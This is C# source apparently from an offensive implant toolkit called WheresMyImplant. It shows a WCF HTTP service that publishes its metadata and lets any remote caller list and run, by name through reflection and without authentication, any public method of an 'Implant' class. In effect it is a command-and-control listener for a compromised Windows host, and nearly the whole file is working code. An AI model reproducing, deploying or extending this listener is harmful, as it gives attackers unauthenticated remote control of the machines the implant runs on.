using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ServiceModel;
using System.ServiceModel.Description;
using System.Reflection;

namespace WheresMyImplant
{
    [ServiceContract]
    interface IServiceEndpoint
    {
        [OperationContract]
        String Pong(String Ping);

        [OperationContract]
        String AdvertiseMethods();

        [OperationContract]
        String AdvertiseMethodParameters(String method);

        [OperationContract]
        String ActivateMethod(String method, Object[] arguments);
    }

    //[ServiceBehavior(InstanceContextMode = InstanceContextMode.PerCall)]
    public class ServiceEndpoint : IServiceEndpoint
    {
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public String Pong(String Ping)
        {
            if ("PING" == Ping)
            {
                return "PONG";
            }
            else
            {
                return "404";
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Taken from SMB Server - should make a wrapper so both can use this
        ////////////////////////////////////////////////////////////////////////////////
        public String AdvertiseMethods()
        {
            String[] skipMethods = {
                "System.String ToString()",
                "Boolean Equals(System.Object)",
                "Int32 GetHashCode()",
                "System.Type GetType()"};

            MethodInfo[] methods = typeof(Implant).GetMethods();
            StringBuilder sbLoadedMethods = new StringBuilder();
            foreach (MethodInfo method in methods)
            {
                if (!skipMethods.Any(method.ToString().Contains))
                {
                    sbLoadedMethods.Append(method.ToString() + "\n");
                }
            }
            return sbLoadedMethods.ToString();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Taken from SMB Server - should make a wrapper so both can use this
        ////////////////////////////////////////////////////////////////////////////////
        public String AdvertiseMethodParameters(String method)
        {
            MethodInfo methodInfo = typeof(Implant).GetMethod(method);
            StringBuilder sbParameters = new StringBuilder();
            ParameterInfo[] parameterInfo = methodInfo.GetParameters();
            foreach (ParameterInfo parameter in parameterInfo)
            {
                sbParameters.Append(String.Format("{0}|{1}\0", parameter.Position, parameter.Name));
            }
            return sbParameters.ToString();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Taken from SMB Server - should make a wrapper so both can use this
        ////////////////////////////////////////////////////////////////////////////////
        public String ActivateMethod(String strMethod, Object[] arguments)
        {
            Console.WriteLine("Activating: {0}", strMethod);
            Type implantType = typeof(Implant);
            MethodInfo methodInfo = implantType.GetMethod(strMethod);
            String returnValue = (String)methodInfo.Invoke(null, arguments);
            return returnValue;
        }
    }

    class WebService
    {
        internal WebService(String serviceName, String port)
        {
            //Runas admin or netsh http add urlacl url=http://+:8080/hello user=DOMAIN\user
            //svcutil.exe /language:cs /out:generatedProxy.cs /config:app.config http://localhost:8000/ServiceModelSamples/service

            Uri baseAddress = new Uri(String.Format("http://{0}:{1}/{2}", Environment.MachineName, port, serviceName));
            using (ServiceHost serviceHost = new ServiceHost(typeof(ServiceEndpoint), baseAddress))
            {
                ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
                smb.HttpGetEnabled = true;
                smb.MetadataExporter.PolicyVersion = PolicyVersion.Policy15;
                serviceHost.Description.Behaviors.Add(smb);

                serviceHost.AddServiceEndpoint(typeof(WheresMyImplant.IServiceEndpoint), new BasicHttpBinding(), baseAddress);
                serviceHost.Open();

                Console.WriteLine("The service is ready at {0}", baseAddress);
                Console.WriteLine("Press <Enter> to stop the service.");
                Console.ReadLine();

                // Close the ServiceHost.
                serviceHost.Close();
            }
        }
    }
}
